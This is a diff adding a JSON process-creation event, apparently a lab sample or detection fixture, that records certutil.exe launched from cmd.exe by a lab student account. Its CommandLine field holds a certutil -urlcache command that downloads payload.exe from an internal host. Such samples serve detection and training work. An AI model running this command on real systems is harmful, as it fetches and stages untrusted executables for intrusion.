@@ -1,0 +1,12 @@
+{
+ "Image": "C:\\Windows\\System32\\certutil.exe",
+ "CommandLine": "certutil.exe -urlcache -f http://10.0.0.5/payload.exe payload.exe",
+ "OriginalFileName": "CERTUTIL.EXE",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+ "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+ "User": "LABPC\\student",
+ "IntegrityLevel": "Medium",
+ "Description": "",
+ "Product": "",
+ "Company": ""
+}
